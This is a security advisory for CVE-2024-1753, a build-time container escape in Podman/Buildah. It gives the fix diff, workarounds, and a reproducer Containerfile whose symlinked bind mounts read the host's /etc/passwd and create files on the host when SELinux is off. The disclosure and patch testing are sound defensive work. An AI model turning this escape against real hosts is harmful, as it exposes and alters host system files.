summary: "Podman affected by CVE-2024-1753 container escape at build time\n### Impact\n_What\
  \ kind of vulnerability is it? Who is impacted?_\n\nUsers running containers with root privileges\
  \ allowing a container to run with read/write access to the host system files when selinux\
  \ is not enabled.  With selinux enabled, some read access is allowed.\n\n### Patches\nFrom\
  \ @nalind .  This is a patch for Buildah (https://github.com/containers/buildah).  Once fixed\
  \ there, Buildah will be vendored into Podman.\n\n```\n# cat /root/cve-2024-1753.diff\n---\
  \ internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n\
  \ \n \t\"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n \t\"github.com/containers/buildah/define\"\
  \n \t\"github.com/containers/buildah/internal\"\n \tinternalParse \"github.com/containers/buildah/internal/parse\"\
  \n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir\
  \ string, st\n \t// buildkit parity: support absolute path for sources from current build\
  \ context\n \tif contextDir != \"\" {\n \t\t// path should be /contextDir/specified path\n\
  -\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n\
  +\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\
  \tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n\
  \ \t} else {\n \t\t// looks like its coming from `build run --mount=type=bind` allow using\
  \ absolute path\n \t\t// error out if no source is set\n```\n### Reproducer\n\nPrior to testing,\
  \ as root, add a memorable username to `/etc/passwd` via adduser or your favorite editor.\
  \   Also create a memorably named file in `/`.  Suggest: `touch /SHOULDNTSEETHIS.txt` and\
  \ `adduser SHOULDNTSEETHIS`.  After testing, remember to remove both the file and the user\
  \ from your system.\n\nUse the following Containerfile\n\n```\n# cat ~/cve_Containerfile\n\
  FROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo\
  \ \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's\
  \ root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw\
  \ ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit\
  \ show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\
  \nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd;\
  \ cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n```\n\n#### To Test\n\n#####\
  \ Testing with an older version of Podman with the issue\n```\nsetenforce 0\npodman build\
  \ -f ~/cve_Containerfile .\n```\n\nAs part of the printout from the build, you should be able\
  \ to see the contents of the `/' and `/etc` directories, including the `/SHOULDNOTSEETHIS.txt`\
  \ file that you created, and the contents of the `/etc/passwd` file which will include the\
  \ `SHOULDNOTSEETHIS` user that you created.  In addition, the file `/BIND_BREAKOUT` and `/etc/BIND_BREAKOUT2`\
  \ will exist on the host after the command is completed.  Be sure to remove those two files\
  \ between tests.  \n\n```\npodman rm -a\npodman rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\n\
  setenforce 1\npodman build -f ~/cve_Containerfile .\n```\nNeither the `/BIND_BREAKEOUT` or\
  \ `/etc/BIND_BREAKOUT2` files should be created.  An error should be raised during the build\
  \ when both files are trying to be created.  Also, errors will be raised when the build tries\
  \ to display the contents of the `/etc/passwd` file, and nothing will be displayed from that\
  \ file.  \n\nHowever, the files in both the `/` and `/etc` directories on the host system\
  \ will be displayed.\n\n##### Testing with the patch\n\nUse the same commands as testing with\
  \ an older version of Podman.\n\nWhen running using the patched version of Podman, regardless\
  \ of the `setenforce` settings,  you should not see the file that you created or the user\
  \ that you added.  Also the `/BIND_BREAKOUT` and the `/etc/BIND_BREAKOUT` will not exist on\
  \ the host after the test completes.\n\nNOTE: With the fix, the contents of the `/` and `/etc`\
  \ directories, and the `/etc/passwd` file will be displayed, however, it will be the file\
  \ and contents from the container image, and NOT the host system.  Also the `/BIND_BREAKOUT`\
  \ and `/etc/BIND_BREAKOUT` files will be created in the container image.\n\n\n### Workarounds\n\
  Ensure selinux controls are in place to avoid compromising sensitive system files and systems.\
  \  With \"setenforce 0\" set, which is not at all advised, the root file system is open for\
  \ modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation,\
  \ files can not be changed.  However, the contents of the `/` directory can be displayed.\
  \  I.e., `ls -alF /` will show the contents of the host directory.\n\n### References\n\nUnknown."
